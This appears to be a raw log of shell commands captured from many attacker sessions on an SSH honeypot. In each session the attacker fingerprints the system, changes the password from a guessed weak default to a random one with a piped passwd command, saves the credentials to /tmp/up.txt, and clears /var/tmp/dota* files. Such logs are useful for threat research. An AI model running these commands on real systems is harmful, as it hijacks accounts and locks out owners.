+cat /proc/cpuinfo | grep name | wc -l
+echo -e "nospam\nXcpaNBCJVaOT\nXcpaNBCJVaOT"|passwd|bash
+echo "nospam\nXcpaNBCJVaOT\nXcpaNBCJVaOT\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin nospam" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: ed64afc1ec43
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qwe1\nfA5to9QsPUTk\nfA5to9QsPUTk"|passwd|bash
+echo "qwe1\nfA5to9QsPUTk\nfA5to9QsPUTk\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qwe1" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: e51781f5ac60
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "test123\ny7CiZbqxDCmq\ny7CiZbqxDCmq"|passwd|bash
+echo "test123\ny7CiZbqxDCmq\ny7CiZbqxDCmq\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin test123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 16279b1186b9
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "changeme\ntoGd5Bz3Otpn\ntoGd5Bz3Otpn"|passwd|bash
+echo "changeme\ntoGd5Bz3Otpn\ntoGd5Bz3Otpn\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin changeme" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: c6929f09657f
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin12345\nGQ7EhKmsG1J8\nGQ7EhKmsG1J8"|passwd|bash
+echo "admin12345\nGQ7EhKmsG1J8\nGQ7EhKmsG1J8\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin12345" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: f34d9a3a8f62
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "nimda\nvc4nMOEDrfg1\nvc4nMOEDrfg1"|passwd|bash
+echo "nimda\nvc4nMOEDrfg1\nvc4nMOEDrfg1\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin nimda" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: a883d92f4bb9
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "p@ssword\nJx84iNlA3AyN\nJx84iNlA3AyN"|passwd|bash
+echo "p@ssword\nJx84iNlA3AyN\nJx84iNlA3AyN\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin p@ssword" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 4f05452e7291
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "p@ssword\nJx84iNlA3AyN\nJx84iNlA3AyN"|passwd|bash
+echo "p@ssword\nJx84iNlA3AyN\nJx84iNlA3AyN\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin p@ssword" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: ec73b92a2c24
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "p@ssword\nJx84iNlA3AyN\nJx84iNlA3AyN"|passwd|bash
+echo "p@ssword\nJx84iNlA3AyN\nJx84iNlA3AyN\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin p@ssword" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 1f5e5a736941
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qwe@1234\n8EHELdXbsjGP\n8EHELdXbsjGP"|passwd|bash
+echo "qwe@1234\n8EHELdXbsjGP\n8EHELdXbsjGP\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qwe@1234" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 0be69128e6a6
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123123\nNJER3cezLgOX\nNJER3cezLgOX"|passwd|bash
+echo "123123\nNJER3cezLgOX\nNJER3cezLgOX\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 939db01f654b
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "1qaz@WSX3edc\nHHCzlvHymrsp\nHHCzlvHymrsp"|passwd|bash
+echo "1qaz@WSX3edc\nHHCzlvHymrsp\nHHCzlvHymrsp\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 1qaz@WSX3edc" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: ba821930fdde
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "welcome\nfKKf28IPl0do\nfKKf28IPl0do"|passwd|bash
+echo "welcome\nfKKf28IPl0do\nfKKf28IPl0do\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin welcome" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 175f3cf0f9dc
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qwe@1234\n8EHELdXbsjGP\n8EHELdXbsjGP"|passwd|bash
+echo "qwe@1234\n8EHELdXbsjGP\n8EHELdXbsjGP\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qwe@1234" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 83f4a544090d
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "54321\n1BvSasRyRWwq\n1BvSasRyRWwq"|passwd|bash
+echo "54321\n1BvSasRyRWwq\n1BvSasRyRWwq\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 54321" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: b060bf5727a6
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "q1w2e3r4t5y6\nqXzZdqw51TYp\nqXzZdqw51TYp"|passwd|bash
+echo "q1w2e3r4t5y6\nqXzZdqw51TYp\nqXzZdqw51TYp\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin q1w2e3r4t5y6" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: a53327ec8c19
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qwe@1234\n8EHELdXbsjGP\n8EHELdXbsjGP"|passwd|bash
+echo "qwe@1234\n8EHELdXbsjGP\n8EHELdXbsjGP\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qwe@1234" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 9dda86cc4aa3
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "P@55w0rd\nk6FYFmo2i0kQ\nk6FYFmo2i0kQ"|passwd|bash
+echo "P@55w0rd\nk6FYFmo2i0kQ\nk6FYFmo2i0kQ\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin P@55w0rd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 7702eddafb76
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "access\naimBuYgMcOeq\naimBuYgMcOeq"|passwd|bash
+echo "access\naimBuYgMcOeq\naimBuYgMcOeq\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin access" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 88b98a711f1b
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "P@55w0rd\nUUvtKeYdwffB\nUUvtKeYdwffB"|passwd|bash
+echo "P@55w0rd\nUUvtKeYdwffB\nUUvtKeYdwffB\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin P@55w0rd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 39d4b2cf965f
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "P@55w0rd\nUUvtKeYdwffB\nUUvtKeYdwffB"|passwd|bash
+echo "P@55w0rd\nUUvtKeYdwffB\nUUvtKeYdwffB\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin P@55w0rd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 967a13b4c895
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "P@ssw0rds\ngRkBac1x82d0\ngRkBac1x82d0"|passwd|bash
+echo "P@ssw0rds\ngRkBac1x82d0\ngRkBac1x82d0\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin P@ssw0rds" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: a50e2c897d6e
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "P@55w0rd\nTWWipNDHj2V9\nTWWipNDHj2V9"|passwd|bash
+echo "P@55w0rd\nTWWipNDHj2V9\nTWWipNDHj2V9\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin P@55w0rd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: f41e2f4a178d
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "P@55w0rd\nTWWipNDHj2V9\nTWWipNDHj2V9"|passwd|bash
+echo "P@55w0rd\nTWWipNDHj2V9\nTWWipNDHj2V9\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin P@55w0rd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: a2e84a42a1db
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "P@55w0rd\nExq2HD9xBLWH\nExq2HD9xBLWH"|passwd|bash
+echo "P@55w0rd\nExq2HD9xBLWH\nExq2HD9xBLWH\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin P@55w0rd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 704410c91f5d
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin@1234\nL2LnjT2qgBf3\nL2LnjT2qgBf3"|passwd|bash
+echo "admin@1234\nL2LnjT2qgBf3\nL2LnjT2qgBf3\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin@1234" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 7a4efe460ce1
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "P@55w0rd\nAkiDQTG00X6m\nAkiDQTG00X6m"|passwd|bash
+echo "P@55w0rd\nAkiDQTG00X6m\nAkiDQTG00X6m\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin P@55w0rd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 3d7cf90aea85
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin@1234\nxSwwHhfyX00l\nxSwwHhfyX00l"|passwd|bash
+echo "admin@1234\nxSwwHhfyX00l\nxSwwHhfyX00l\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin@1234" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 2a609e61015e
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "changeme\nW0EVMU7nSDcV\nW0EVMU7nSDcV"|passwd|bash
+echo "changeme\nW0EVMU7nSDcV\nW0EVMU7nSDcV\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin changeme" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 304445d22063
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "changeme\n3iVI7UD7q9pu\n3iVI7UD7q9pu"|passwd|bash
+echo "changeme\n3iVI7UD7q9pu\n3iVI7UD7q9pu\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin changeme" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 7b4692ef9e8b
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin@1234\nOSUgzDPTyPL2\nOSUgzDPTyPL2"|passwd|bash
+echo "admin@1234\nOSUgzDPTyPL2\nOSUgzDPTyPL2\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin@1234" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 35efa8673ac3
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "secret\ni0JZiAuEMBrp\ni0JZiAuEMBrp"|passwd|bash
+echo "secret\ni0JZiAuEMBrp\ni0JZiAuEMBrp\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin secret" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 589feae95a40
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123qweasd\n3DNlSKLDT0da\n3DNlSKLDT0da"|passwd|bash
+echo "123qweasd\n3DNlSKLDT0da\n3DNlSKLDT0da\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123qweasd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 8787959c1485
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "pass@123\nmCYpjvDMyStt\nmCYpjvDMyStt"|passwd|bash
+echo "pass@123\nmCYpjvDMyStt\nmCYpjvDMyStt\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin pass@123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 0fc15c0539ae
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "P@55w0rd!\nbZR79pYYI4yr\nbZR79pYYI4yr"|passwd|bash
+echo "P@55w0rd!\nbZR79pYYI4yr\nbZR79pYYI4yr\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin P@55w0rd!" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 75b487ce89b6
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "songswell\nz8gwrmH5VKbP\nz8gwrmH5VKbP"|passwd|bash
+echo "songswell\nz8gwrmH5VKbP\nz8gwrmH5VKbP\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin songswell" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 5c67efa380cf
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "P@ssw0rd123\nlk7UO1p0gbYE\nlk7UO1p0gbYE"|passwd|bash
+echo "P@ssw0rd123\nlk7UO1p0gbYE\nlk7UO1p0gbYE\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin P@ssw0rd123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 89f815acda30
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "welcome\nyMX5gBZATH3O\nyMX5gBZATH3O"|passwd|bash
